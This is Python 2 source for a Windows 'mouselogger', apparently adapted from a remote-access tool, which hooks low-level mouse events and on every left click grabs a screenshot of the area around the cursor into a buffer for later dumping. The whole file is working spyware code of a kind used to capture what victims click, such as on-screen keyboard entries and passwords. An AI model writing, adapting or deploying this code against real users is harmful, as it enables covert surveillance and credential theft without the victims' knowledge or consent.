# Mostly stolen from Nicolas VERDIER (contact@n1nj4.eu)
# Mostly stolen and recreated by golind
import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
import threading
import time

from ctypes import (
	byref, memset, pointer, sizeof, windll,
	c_void_p as LPRECT,
	c_void_p as LPVOID,
	create_string_buffer,
	Structure,
	POINTER,
	WINFUNCTYPE,
)
import ctypes.wintypes
from ctypes.wintypes import (
	BOOL, DOUBLE, DWORD, HANDLE, HBITMAP, HDC, HGDIOBJ,
	HWND, INT, LPARAM, LONG,RECT,SHORT, UINT, WORD
)

class BITMAPINFOHEADER(Structure):
	_fields_ = [
		('biSize',		  DWORD),
		('biWidth',		 LONG),
		('biHeight',		LONG),
		('biPlanes',		WORD),
		('biBitCount',	  WORD),
		('biCompression',   DWORD),
		('biSizeImage',	 DWORD),
		('biXPelsPerMeter', LONG),
		('biYPelsPerMeter', LONG),
		('biClrUsed',	   DWORD),
		('biClrImportant',  DWORD)
	]

class BITMAPINFO(Structure):
	_fields_ = [
		('bmiHeader', BITMAPINFOHEADER),
		('bmiColors', DWORD * 3)
	]

# http://nullege.com/codes/show/src@m@o@mozharness-HEAD@external_tools@mouse_and_screen_resolution.py/114/ctypes.windll.user32.GetCursorPos
from ctypes import windll, Structure, c_ulong, byref

class POINT(Structure):
	_fields_ = [("x", c_ulong), ("y", c_ulong)]

def queryMousePosition():
	pt = POINT()
	windll.user32.GetCursorPos(byref(pt))
	return { "x": pt.x, "y": pt.y}

user32 = windll.user32
kernel32 = windll.kernel32
WH_MOUSE_LL=14
WM_MOUSEFIRST=0x0200

keyCodes={
	0x200 : "", #"[MOUSEMOVE]", ## commented bcuz it spams the living crap out of the output.
	0x201 : "", #"[LBUTTONDOWN]",
	0x202 : "", #"[LBUTTONUP]",
	0x203 : "", #"[LBUTTONDBLCLK]",
	0x204 : "", #"[RBUTTONDOWN]",
	0x205 : "", #"[RBUTTONUP]",
	0x206 : "", #"[RBUTTONDBLCLK]",
	0x207 : "", #"[MBUTTONDOWN]",
	0x208 : "", #"[MBUTTONUP]",
	0x209 : "", #"[MBUTTONDBLCLK]",
	0x20A : "", #"[MOUSEWHEEL]",
	0x20B : "", #"[XBUTTONDOWN]",
	0x20C : "", #"[XBUTTONUP]",
	0x20D : "", #"[XBUTTONDBLCLK]",
	0x20E : "", #"[MOUSEHWHEEL]"
}

# Initilisations
SM_XVIRTUALSCREEN = 76
SM_YVIRTUALSCREEN = 77
SM_CXVIRTUALSCREEN = 78
SM_CYVIRTUALSCREEN = 79
SRCCOPY = 0xCC0020  # Code de copie pour la fonction BitBlt()##
DIB_RGB_COLORS = 0

GetSystemMetrics = windll.user32.GetSystemMetrics##
EnumDisplayMonitors = windll.user32.EnumDisplayMonitors
GetWindowDC = windll.user32.GetWindowDC
CreateCompatibleDC = windll.gdi32.CreateCompatibleDC
CreateCompatibleBitmap = windll.gdi32.CreateCompatibleBitmap
SelectObject = windll.gdi32.SelectObject
BitBlt = windll.gdi32.BitBlt
GetDIBits = windll.gdi32.GetDIBits
DeleteObject = windll.gdi32.DeleteObject

# Type des arguments
MONITORENUMPROC = WINFUNCTYPE(INT, DWORD, DWORD,
	POINTER(RECT), DOUBLE)
GetSystemMetrics.argtypes = [INT]
EnumDisplayMonitors.argtypes = [HDC, LPRECT, MONITORENUMPROC, LPARAM]
GetWindowDC.argtypes = [HWND]
CreateCompatibleDC.argtypes = [HDC]
CreateCompatibleBitmap.argtypes = [HDC, INT, INT]
SelectObject.argtypes = [HDC, HGDIOBJ]
BitBlt.argtypes = [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD]
DeleteObject.argtypes = [HGDIOBJ]
GetDIBits.argtypes = [HDC, HBITMAP, UINT, UINT, LPVOID,
	POINTER(BITMAPINFO), UINT]

# Type de fonction
GetSystemMetrics.restypes = INT
EnumDisplayMonitors.restypes = BOOL
GetWindowDC.restypes = HDC
CreateCompatibleDC.restypes = HDC
CreateCompatibleBitmap.restypes = HBITMAP
SelectObject.restypes = HGDIOBJ
BitBlt.restypes =  BOOL
GetDIBits.restypes = INT
DeleteObject.restypes = BOOL

class MouseLogger(threading.Thread):
	def __init__(self, *args, **kwargs):
		threading.Thread.__init__(self, *args, **kwargs)
		self.hooked  = None
		self.daemon=True
		self.keys_buffer=""
		self.lUser32=user32
		self.pointer=None
		self.stopped=False

	def run(self):
		if self.install_hook():
			print "mouselogger installed"
		else:
			raise RuntimeError("couldn't install mouselogger")
		msg = MSG()
		user32.GetMessageA(byref(msg),0,0,0)
		while not self.stopped:
			time.sleep(.2)
		self.uninstall_hook()
			
	def stop(self):
		self.stopped=True

	def dump(self):
		res=self.keys_buffer
		self.keys_buffer=""
		return res

	def convert_key_code(self, code):
		##http://www.pinvoke.net/default.aspx/Constants.WM
		if code in keyCodes:
			if code == 0x201:
				pos = queryMousePosition()

				limit_width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
				limit_height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
				limit_left = GetSystemMetrics(SM_XVIRTUALSCREEN)
				limit_top = GetSystemMetrics(SM_YVIRTUALSCREEN)

				height = min(100,limit_height)
				width = min(200,limit_width)
				left = max(pos['x']-100,limit_left)
				top = max(pos['y']-50,limit_top)

				srcdc = GetWindowDC(0)
				memdc = CreateCompatibleDC(srcdc)
				bmp = CreateCompatibleBitmap(srcdc, width, height)
				try:
					SelectObject(memdc, bmp)
					BitBlt(memdc, 0, 0, width, height, srcdc, left, top, SRCCOPY)
					bmi = BITMAPINFO()
					bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
					bmi.bmiHeader.biWidth = width
					bmi.bmiHeader.biHeight = height
					bmi.bmiHeader.biBitCount = 24
					bmi.bmiHeader.biPlanes = 1
					buffer_len = height * ((width * 3 + 3) & -4)
					pixels = create_string_buffer(buffer_len)
					bits = GetDIBits(memdc, bmp, 0, height, byref(pixels),
						pointer(bmi), DIB_RGB_COLORS)
				finally:
					DeleteObject(srcdc)
					DeleteObject(memdc)
					DeleteObject(bmp)

				if bits != height or len(pixels.raw) != buffer_len:
					raise ValueError('MSSWindows: GetDIBits() failed.')

				return pixels.raw
			return keyCodes[code]

	def install_hook(self):
		CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
		self.pointer = CMPFUNC(self.hook_proc)
		self.hooked = self.lUser32.SetWindowsHookExA(WH_MOUSE_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
		if not self.hooked:
			return False
		return True
	
	def uninstall_hook(self):
		if self.hooked is None:
			return
		self.lUser32.UnhookWindowsHookEx(self.hooked)
		self.hooked = None

	def hook_proc(self, nCode, wParam, lParam):
		hooked_key = self.convert_key_code(wParam)
		self.keys_buffer+=str(hooked_key)
		return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)

if __name__=="__main__":
	MouseLogger = MouseLogger()
	MouseLogger.start()
	while True:
		time.sleep(5)
		print MouseLogger.dump()
